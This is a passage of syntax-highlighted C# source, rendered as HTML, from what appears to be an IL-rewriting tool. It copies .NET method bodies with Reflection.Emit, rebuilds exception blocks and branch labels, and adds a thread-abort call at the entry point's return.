                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"L_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">TryOffset</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"to"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"L_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">TryOffset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">TryLength</span><span class="sc10">).</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ExceptionHandlerType</span><span class="sc10">.</span><span class="sc11">Catch</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"catch"</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">CatchType</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ExceptionHandlerType</span><span class="sc10">.</span><span class="sc11">Filter</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"filter"</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"L_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">FilterOffset</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ExceptionHandlerType</span><span class="sc10">.</span><span class="sc11">Finally</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"finally"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ExceptionHandlerType</span><span class="sc10">.</span><span class="sc11">Fault</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"fault"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"L_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">HandlerOffset</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"to"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"L_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">HandlerOffset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">HandlerLength</span><span class="sc10">).</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">();</span><span class="sc0">   
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc2">// Labels
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">labelnum</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Instruction</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">GetInstructions</span><span class="sc10">())</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0"> 
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Code</span><span class="sc10">.</span><span class="sc11">OperandType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">ShortInlineBrTarget</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Code</span><span class="sc10">.</span><span class="sc11">OperandType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineBrTarget</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc11">labelnum</span><span class="sc10">++;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Code</span><span class="sc10">.</span><span class="sc11">OperandType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineSwitch</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc11">labelnum</span><span class="sc10">+=((</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">[])</span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Operand</span><span class="sc10">).</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">Label</span><span class="sc0">  </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">labels</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Label</span><span class="sc10">[</span><span class="sc11">labelnum</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">labeloffsets</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">[</span><span class="sc11">labelnum</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Instruction</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">GetInstructions</span><span class="sc10">())</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Code</span><span class="sc10">.</span><span class="sc11">OperandType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">ShortInlineBrTarget</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Operand</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">labeloffsets</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">labels</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">DefineLabel</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Code</span><span class="sc10">.</span><span class="sc11">OperandType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineBrTarget</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Operand</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">labeloffsets</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">labels</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">DefineLabel</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc2">// switch labels
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Code</span><span class="sc10">.</span><span class="sc11">OperandType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineSwitch</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Operand</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">lofs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">[])</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">foreach</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ofs</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">lofs</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">labeloffsets</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ofs</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">labels</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">DefineLabel</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">// Instructions
</span><span class="sc0">            </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">skip</span><span class="sc10">=</span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">instrnum</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">instrnum</span><span class="sc10">&lt;</span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">GetInstructions</span><span class="sc10">().</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">instrnum</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">skip</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">skip</span><span class="sc10">=</span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">Instruction</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">=</span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">GetInstructions</span><span class="sc10">()[</span><span class="sc11">instrnum</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">OpCode</span><span class="sc0"> </span><span class="sc11">code</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Code</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">GetHashCode</span><span class="sc10">()==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ldloc</span><span class="sc10">.</span><span class="sc11">GetHashCode</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                    </span><span class="sc11">instrnum</span><span class="sc10">&lt;</span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">GetInstructions</span><span class="sc10">().</span><span class="sc11">Length</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                    </span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">GetInstructions</span><span class="sc10">()[</span><span class="sc11">instrnum</span><span class="sc10">].</span><span class="sc11">Code</span><span class="sc10">.</span><span class="sc11">GetHashCode</span><span class="sc10">()==</span><span class="sc0">
                    </span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Pop</span><span class="sc10">.</span><span class="sc11">GetHashCode</span><span class="sc10">())</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">skip</span><span class="sc10">=</span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">GetHashCode</span><span class="sc10">()==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Nop</span><span class="sc10">.</span><span class="sc11">GetHashCode</span><span class="sc10">())</span><span class="sc0">
                    </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">rce</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc10">(</span><span class="sc11">ExceptionHandler</span><span class="sc0"> </span><span class="sc11">handler</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">exceptions</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">TryOffset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Offset</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"BEGIN TRY L_"</span><span class="sc10">+</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">TryOffset</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                        </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">BeginExceptionBlock</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//       try-catch!
</span><span class="sc0">                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">Type</span><span class="sc10">==</span><span class="sc11">ExceptionHandlerType</span><span class="sc10">.</span><span class="sc11">Filter</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">FilterOffset</span><span class="sc10">==</span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Offset</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">BeginExceptFilterBlock</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">HandlerOffset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Offset</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">Type</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">ExceptionHandlerType</span><span class="sc10">.</span><span class="sc11">Catch</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc2">//il.EndExceptionBlock(); // ?
</span><span class="sc0">                                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">BeginCatchBlock</span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">CatchType</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">ExceptionHandlerType</span><span class="sc10">.</span><span class="sc11">Fault</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">BeginFaultBlock</span><span class="sc10">();</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">ExceptionHandlerType</span><span class="sc10">.</span><span class="sc11">Filter</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">BeginExceptFilterBlock</span><span class="sc10">();</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">ExceptionHandlerType</span><span class="sc10">.</span><span class="sc11">Finally</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">BeginFinallyBlock</span><span class="sc10">();</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">HandlerOffset</span><span class="sc10">+</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">HandlerLength</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Offset</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">bLastHanlderInBlock</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">foreach</span><span class="sc10">(</span><span class="sc11">ExceptionHandler</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">exceptions</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">.</span><span class="sc11">HandlerOffset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">HandlerOffset</span><span class="sc10">+</span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">HandlerLength</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc11">bLastHanlderInBlock</span><span class="sc10">=</span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">bLastHanlderInBlock</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">EndExceptionBlock</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"END TRY L_"</span><span class="sc10">+</span><span class="sc0">
                                </span><span class="sc11">handler</span><span class="sc10">.</span><span class="sc11">TryOffset</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"NOT LAST CATCH"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc2">// mark labels
</span><span class="sc0">                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">labeloffsets</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">labeloffsets</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Offset</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">MarkLabel</span><span class="sc10">(</span><span class="sc11">labels</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                
                </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Operand</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">operandData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">GetOperandData</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc2">// if this method is EP and ret is emitted, add Go() thread stop
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">entrypoint</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ret</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">rce</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ldloc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">loc</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">MethodInfo</span><span class="sc0"> </span><span class="sc11">miAbort</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">.</span><span class="sc11">Thread</span><span class="sc10">).</span><span class="sc11">GetMethod</span><span class="sc10">(</span><span class="sc6">"Abort"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Callvirt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">miAbort</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">



</span><span class="sc9">#if DEBUGCONSOLE
